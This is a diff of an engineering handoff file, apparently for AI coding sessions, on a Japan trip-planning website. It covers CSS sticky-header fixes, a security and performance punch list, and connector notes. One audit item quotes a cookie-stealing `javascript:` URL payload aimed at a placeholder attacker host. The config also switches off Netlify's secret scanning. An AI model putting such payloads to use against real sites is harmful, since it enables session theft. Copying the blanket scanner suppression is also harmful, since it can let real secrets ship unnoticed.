@@ -355,10 +355,19 @@ clone).
 
 [build.environment]
   NODE_VERSION = "20"
+  SECRETS_SCAN_OMIT_KEYS = "GOOGLE_MAPS_API_KEY"
+  SECRETS_SCAN_SMART_DETECTION_ENABLED = "false"
 ```
 
 The build replaces the literal `%GOOGLE_MAPS_API_KEY%` placeholder in
 `config.js` with the value of the `GOOGLE_MAPS_API_KEY` env var.
+
+**Both `SECRETS_SCAN_*` lines are required** — Netlify runs two scanners on
+the publish dir: an env-var scan (suppressed by `OMIT_KEYS`) and a smart
+pattern-detection scan that flags anything starting with `AIza…`
+(suppressed by `SMART_DETECTION_ENABLED=false`). If you remove either,
+the deploy fails with "Secrets scanning found secrets in build." Bitten
+twice in 2026-04 — see commits `faa0e4b`, `5a50a0d`.
 
 ### API key handling — read carefully
 
@@ -411,9 +420,22 @@ hard-code tokens — surface them through environment-level credentials.
 
 ### CSS / layout
 
-- **Mobile horizontal-overflow guard is non-negotiable.** `html { overflow-x:
-  hidden }` and `body { overflow-x: hidden; max-width: 100vw }` are global.
-  Content containers carry `min-width:0` and `overflow-wrap:anywhere` so flex
+- **Mobile horizontal-overflow guard is non-negotiable** — and it MUST use
+  `overflow-x: clip`, NOT `overflow-x: hidden`, on both `html` and `body`.
+  Per CSS spec, `overflow: hidden` on an ancestor creates a scroll-clip
+  container that breaks `position: sticky` on the toolbar and tab-nav (the
+  header just scrolls away "like a PDF"). `overflow-x: clip` provides the
+  same horizontal-overflow protection without that side effect. Browser
+  support: Chrome 90+, Firefox 81+, Safari 16+ — well within target.
+  Bitten by this in 2026-04 (commit `e2a87cb` → fixed in `848a82b`).
+- **Do not set `body { max-width: 100vw }`** either — superfluous once
+  `overflow-x:clip` is in place and a known iOS-Safari sticky-breaker
+  (100vw includes the scrollbar gutter on desktop).
+- **Watch out for any code path that sets `body.style.overflow='hidden'`
+  or `documentElement.style.overflow='hidden'`** (e.g. modal open/close
+  in `extras.js`, `search.js`). Same mechanism — if the restore is missed
+  due to an exception, the sticky toolbar dies. Wrap in try/finally.
+- Content containers carry `min-width:0` and `overflow-wrap:anywhere` so flex
   children can shrink.
 - **The map (`#tab-map`) and tab-nav (`.tab-nav`) opt back into horizontal
   scrolling internally** — don't add a global `overflow-x` rule that breaks them.
@@ -494,6 +516,10 @@ Based on prior sessions:
 ## 13. Recent commit history (most relevant first)
 
 ```
+faa0e4b netlify.toml: suppress secret scanners for the public Maps key
+6d06704 Redact Maps API key from handoff doc to unblock Netlify deploy
+848a82b Header: restore sticky toolbar + tab nav (overflow-x:hidden → clip)
+29b5fda Add HANDOFF_CLAUDE.md: thorough engineering handoff for new AI assistant
 a7bbf34 Search: smart fuzzy search with category filters
 e2a87cb Mobile: prevent horizontal page scroll (region label wrap + global guard)
 f1ae7f7 Tab nav: center on desktop (1280+), tighten padding so all 14 fit
@@ -533,24 +559,122 @@ to soft-delete a row from the site without losing the data.
 
 ---
 
-## 15. Things you might want to do next
+## 15. Open punch list (from 2026-04-28 multi-agent review)
 
-A non-prescriptive list of likely follow-ups so you can pattern-match:
+Six expert review agents went through the codebase on 2026-04-28. None of
+the items below are blockers — the site is shipping fine. They're ordered
+by impact. Pick a batch, ship it as one focused commit, watch the deploy.
 
-- **More search categories** — `bookingPlatforms`, `dietaryCards`, `mapPoints`
-  are not currently indexed. Add them to `CATEGORIES` in `search.js` if useful.
-- **Search keyboard shortcut hint** — currently no visible "⌘K" affordance.
-  Could add a faint label inside the search input border on desktop.
-- **Service worker / offline** — the trip is in Japan; offline support would
-  be valuable. Would need a build step or a hand-written `sw.js`. Static
-  assets are tiny (~50 KB JS, ~200 KB data) so this is feasible.
-- **Dark mode tweaks** — `.search-cat-badge` could read brighter against the
-  warm dark background if user reports legibility issues.
-- **Print quality** — the printable view skips images and the map. Adding a
-  static city-by-city map page could improve the PDF.
-- **Collaborative-add UX** — extras.js is the most fragile file (Google Places
-  Autocomplete, identity gate, form collection). If you change it, test the
-  full add-place + add-day-item + add-booking + add-transport flows manually.
+### P0 — should fix this week
+
+1. **`javascript:` URL XSS via collaborative + Add.** `esc()` in `app.js:4`
+   escapes `<>&"'` but does NOT validate URL schemes. Any collab-add row
+   with `url: "javascript:fetch('//attacker?'+document.cookie)"` lands in
+   `<a href="…">` and fires on click. Sinks: `app.js:529, 605, 829-833`,
+   `extras.js:740`. Fix: one `safeUrl(u)` helper requiring
+   `^(https?:|mailto:|tel:|/|#)`; wrap all four sinks. ~5 lines.
+2. **Broken HTML in ICN renderer** — `<div.section-header"` (typo + bad
+   quote) at `app.js:1029`. Plan-section click handler is silently dead.
+   Fix: `<div class="section-header" onclick="toggleOpen(this.parentElement)">`.
+3. **Render-blocking JS chain.** `index.html:1410-1416` loads 5 scripts
+   without `defer` (~620 KB blocks first paint, including Leaflet which
+   most users don't need). Fix: add `defer` to all five (preserves order;
+   satisfies "search.js loads last"). Lazy-load Leaflet inside `initMap()`.
+
+### P1 — should fix before May 21
+
+4. **iOS input auto-zoom regression** — search inputs and `.ex-input` use
+   font-sizes <16px (`index.html:711, 818, 1030`), which triggers iOS
+   Safari auto-zoom on focus. Bump to 16px.
+5. **Body-overflow leak risk in modal flows** — `extras.js:299, 588` and
+   `search.js:378, 383` set `body`/`documentElement` `style.overflow='hidden'`
+   while modals are open. If an exception throws between open and close,
+   the body stays locked, which kills the sticky toolbar (same symptom as
+   the 2026-04-28 fix, different mechanism). Wrap in try/finally; restore
+   the prior inline value, not `''`.
+6. **Apps Script POST is fully open.** `apps_script.gs:28` accepts any
+   anonymous JSON. A bored visitor can spam-write the Sheet, which renders
+   into the live site. Add a static shared token check (~5 lines) — raises
+   the bar from "anyone with the URL" to "anyone who reads the JS source"
+   and lets you rotate.
+7. **Apps Script GET leaks traveler emails.** `doGet` at `apps_script.gs:55`
+   returns the `added_by_email` column to anonymous callers. Strip it in
+   `readTab_` before responding.
+8. **Identity gate bypass** — `extras.js:321` falls back to
+   `{name:'Anonymous', email:''}` if localStorage is wiped between modal
+   open and submit. Re-check `getIdentity()` inside the submit handler.
+9. **Search index coverage gaps.** `DATA.bookingPlatforms`, `dietaryCards`,
+   `mapPoints`, and ICN rows are present but unindexed. Add CATEGORY
+   entries in `search.js:15-125`.
+10. **Search input not debounced** — full INDEX scan per keystroke. Add
+    80–120 ms debounce around `runSearch`.
+11. **`rerenderActiveTab()` doesn't cover Food / Dining / Attractions /
+    Shopping / Tips / Sams / Phrasebook / Packing / ICN** (`app.js:1130-1148`).
+    Search routes to those tabs, finds no matching `data-sid`, dead-ends.
+12. **Search dialog a11y broken** — `aria-labelledby="searchModalTitle"`
+    references a nonexistent element; no `aria-activedescendant`; no
+    focus-restore on close (`index.html:1387-1401`, `search.js:378-385`).
+13. **Two `banner` landmarks** — both `.topbar` and `.hero` claim banner
+    role. Demote `.hero` to `<section>` (`index.html:1322, 1342`).
+14. **No SRI on Leaflet from unpkg CDN** (`index.html:13, 1410`). Pin
+    `integrity="sha384-…"` for both files, or self-host.
+
+### P2 — nice to have
+
+- **Service worker for offline.** Highest value-per-LOC item. ~40 lines:
+  cache HTML/JS/data/Leaflet/CARTO tiles on install; stale-while-revalidate
+  for index.html. Travelers will be on spotty Japan mobile data.
+- **Tab nav scroll affordance** — right-edge fade gradient hint for the 14
+  tabs (`index.html:262-278`).
+- **Tap targets** — `.tab-btn` ~38px on mobile (<44pt min); `.day-pill`
+  ~28px. Bump padding.
+- **Dark-mode `.search-cat-badge`** legibility (~3.1:1, fails AA contrast).
+- **Undefined CSS vars** — `--card-bg`, `--surface-offset`, `--surface`
+  referenced in `index.html` but never declared; dark-mode extras-modal
+  bg falls back to `#fff` until line 771 overrides.
+- **Two `<meta theme-color>`** both `#0d0606` (`index.html:6-7`); light
+  mode browser chrome wrong.
+- **`setInterval(renderToday, 60_000)`** wipes `#tab-today` every minute,
+  losing scroll/expand state. Update countdown text in-place.
+- **Tab nav ARIA** — add `role="tablist"`/`role="tab"`/`aria-selected`.
+- **PDF export has no map** — render a static OSM PNG of day pins, or
+  document the limitation.
+- **Redundant in-tab search bars** on Food/Attractions/Shopping (the global
+  ⌘K replaces them); Dining keeps its filter intentionally.
+
+### Suggested batches
+
+- **Batch A (security, ~30 min):** P0 #1, #2, P1 #6, #7, #8 — closes the
+  only externally exploitable risks.
+- **Batch B (perf & mobile, ~20 min):** P0 #3, P1 #4, #9, #10 — visible
+  TTI win + no-zoom inputs + complete search.
+- **Batch C (sticky-toolbar belt-and-suspenders, ~15 min):** P1 #5 alone
+  — prevents the regression from coming back via a different code path.
+
+---
+
+## 15a. Connectors available to AI sessions (added 2026-04-28)
+
+The user has wired up the following connectors at the Claude Code app
+level. Future sessions should see them in their tool registry on session
+start. **Use them** — don't fall back to web fetches or asking the user
+to copy-paste data.
+
+| Connector | What it unlocks | Likely uses |
+| --------- | --------------- | ----------- |
+| **Netlify** | Trigger deploys, tail build logs, read/write env vars, list deploy history, manage form submissions | Watch the deploy after a push instead of "wait 50s and re-verify"; inspect failed-build logs without copy-paste; rotate `GOOGLE_MAPS_API_KEY` end-to-end (set env var → trigger redeploy) |
+| **Google Calendar** | Read existing events, create new ones, send invites | Generate the 19 day-by-day events from `DATA.days` (date, hotel, agenda, dietary cautions); add booked dining reservations (Chanko Wanko Jun 3, etc.); pre-create transit blocks for shinkansen + Hakone shuttles |
+| **Gmail** | Search inbox for booking confirmations, draft messages | Pull confirmation numbers from the 7 hotel + flight + activity emails into `DATA.bookings`; pre-draft the "trip URL is live" message to the family |
+| **Google Drive** | Read/write the source `Japan 2026 enhanced.xlsx` directly | Run `build_data.py` against the canonical sheet, not a stale local copy; sync changes back; share the printable PDF with the group |
+
+Heuristics for using them well:
+- Before scraping or guessing — try the connector first.
+- For destructive / external-visible actions (sending emails, creating
+  calendar events for everyone, modifying the canonical xlsx) — confirm
+  with the user before executing.
+- The Apps Script + Sheet for collaborative + Add (`apps_script.gs`,
+  Sheet ID `1vBAilO53g5teNXc3IisZ2-22_JfcPi7wiaMG-bFxCnM`) is **separate**
+  from the source xlsx. Don't conflate them.
 
 ---
 
@@ -586,4 +710,6 @@ content; this file (HANDOFF_CLAUDE.md) is sufficient for engineering work.
 
 ---
 
-*Last updated: 2026-04-28 by Charlie + Computer (Perplexity).*
+*Last updated: 2026-04-28 by Charlie + Claude Code session (sticky-header
+fix, Netlify secret-scan workaround restored, multi-agent code review punch
+list, connectors documented).*
